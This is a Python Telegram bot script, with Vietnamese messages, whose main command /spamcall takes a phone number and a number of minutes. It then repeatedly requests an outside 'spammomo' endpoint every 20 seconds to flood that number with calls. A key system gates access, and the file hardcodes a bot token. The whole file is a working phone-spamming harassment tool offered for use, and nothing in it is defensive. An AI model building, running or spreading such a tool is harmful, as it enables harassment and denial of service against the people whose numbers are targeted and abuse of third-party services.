import requests,random
from datetime import datetime, timedelta
from threading import Thread
import os
import telebot
import re
import webbrowser
import time
#config
xnhac = "\33[1;36m"
luc = "\33[1;32m"
vang = "\33[1;33m"
hong = "\33[1;35m"

if os.name == 'nt':
  os.system('cls')
else:
  os.system('clear')

print(f'{xnhac}\t Đang chạy Bot! / {datetime.now()}')
print("{vang} Bắt Đầu Nhận Lệnh")

bot_token = '6167788756:AAGK6fJax88t3FZ_HEd_8DZA8Tl8sRlzoas'

header = {"Accept": "application/json", "Content-Type": "application/json"}

bot = telebot.TeleBot(bot_token)
session = requests.Session()


@bot.message_handler(commands=['start'])
def start(message):
  if message.chat.username:
    username = '@' + message.chat.username
  else:
    username = f"{message.chat.first_name} {message.chat.last_name}"
  text = f'''
┏━━━━━━━━━━━━━━━━━━━━┓
┣➤ - Cách Chạy bot  [/hdsd]
┣➤ - Chạy bot spam gọi điện [/spamcall]
┗━━━━━━━━━━━━━━━━━━━━┛
'''
  bot.send_message(message.chat.id, text)


@bot.message_handler(commands=['hdsd'])
def how(message):
  text = '''
┏━━━━━━━━━━━━━━━━━━━━┓
┣➤ Để Sử Dụng Spam call thì dùng lệnh 
┣➤/spamcall 0877239630 5 
┣➤ trong đó 0877239630 là sdt muốn spam 
┣➤ còn số 5 là tựa chưng cho số phút spam
┗━━━━━━━━━━━━━━━━━━━━┛
┏━━━━━━━━━━━━━━━━━━━━┓
┣➤ Để Sử Dụng Spam Call Thì Lấy Key
┣➤ /getkey Để Lấy Key
┣➤ /key Để Nhập Key
┣➤ 1 Key Spam Được 1 Lần
┗━━━━━━━━━━━━━━━━━━━━┛
'''
  bot.send_message(message.chat.id, text)
@bot.message_handler(commands=['getkey'])
def getkey(message):
  def getkey():
    a = requests.get("https://apigetkey.hoanglailaptrin.repl.co").text.split("<body>")[1].split("@")
    key = a[0].strip()
    url1 = a[1].split("<!--")[0]
    text = "link key : " + url1
    bot.send_message(message.chat.id, text)
    fi = open(f"list/key/{key}.txt","a+")
    fi.write("")
    fi.close()
  a = Thread(target=getkey, args=())
  a.start()

@bot.message_handler(commands=["key"])
def key(message):
  try:
    key = str(message.text.split(' ')[1]).strip()
    fi = open(f"list/key/{key}.txt","r")
    bot.send_message(message.chat.id, "key chính xác")
    os.remove(f"list/key/{key}.txt")
    id = str(message.chat.id).strip()
    fo = open(f"list/user/{id}.txt","a+")
    fo.write("")
    fo.close()
  except:
    bot.send_message(message.chat.id, "key sai")
@bot.message_handler(commands=['spamcall'])
def spam_momo(message):
  try:
    parameters = message.text.split(' ')
    phone = parameters[1]
    minutes = int(parameters[2])
    if not re.match(r'^\d{10}$', phone):
      raise ValueError('Số điện thoại không đúng định dạng')
  except (IndexError, ValueError):
    bot.send_message(
      message.chat.id,
      text=
      'Vui lòng nhập số điện thoại đúng định dạng 10 chữ số và số phút sau lệnh [/spamcall].\nVí dụ: [/momo 0987654321 5]'

    )
    return

  def refresh_url(phone, minutes):
    url = f"https://trumcardvn.com/spammomo.php?phone={phone}"


    start_time = datetime.now()
    end_time = start_time + timedelta(minutes=minutes)

    refresh_count = 0

    while datetime.now() < end_time:
      # Refresh URL
      response = requests.get(url)
      if response.status_code == 200:
        refresh_count += 1
        bot.send_message(
          message.chat.id,
          f"┏━━━━━━━━━━━━━━━━━━━━┓\n┣➤ Bạn đang dùng tools spam call\n┣➤ đã spam  lần thứ {refresh_count}\n┣➤ với số điệ n thoại {phone} thành công\n┗━━━━━━━━━━━━━━━━━━━━┛\n"
        )

        current_time = datetime.now()
        remaining_time = (end_time - current_time).total_seconds()
        bot.send_message(
          message.chat.id,
          f"┏━━━━━━━━━━━━━━━━━━━━┓\n┣➤ Please wait 20 seconds to spam the next time\n┣➤ Đây là tools spam call\n┗━━━━━━━━━━━━━━━━━━━━┛\n"
        )
        time.sleep(20)  # Đợi 30 giây trước khi làm mới URL lần tiếp theo

    bot.send_message(
      message.chat.id,
      f"┏━━━━━━━━━━━━━━━━━━━━┓\n┣➤ successfully spam call sdt\n┣➤ SDT : {phone}\n┣➤ Thời gian : {minutes} Spam minutes on demand\n┗━━━━━━━━━━━━━━━━━━━━┛\n "
    )
  try:
    fil = open(f"list/user/{message.chat.id}.txt")
    os.remove(f"list/user/{message.chat.id}.txt")
    t = Thread(target=refresh_url, args=(phone, minutes))
    t.start()
  except:
    bot.send_message(message.chat.id, "vui lòng nhập /key để thêm key")
  

if __name__ == "__main__":
  bot.polling()
